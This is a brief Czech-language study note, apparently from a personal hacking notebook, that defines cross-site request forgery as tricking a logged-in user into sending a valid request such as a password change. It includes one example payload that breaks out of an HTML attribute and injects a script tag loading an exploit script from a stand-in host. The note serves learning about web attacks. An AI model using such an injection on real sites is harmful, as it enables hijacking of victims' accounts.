---
{"dg-publish":true,"permalink":"/hacking/cross-site-request-forgery-csrf/","dg-note-properties":{"Created":"2026-05-02T13:59","Module":"Exploiting"}}
---

- Donutím cizího přihlášeného uživatele odeslat na server platný request (např. změna hesla), aniž by o tom věděl

```jsx
"><script src=//www.example.com/exploit.js></script> // načte můj skript, který na pozadí např. změní heslo
```
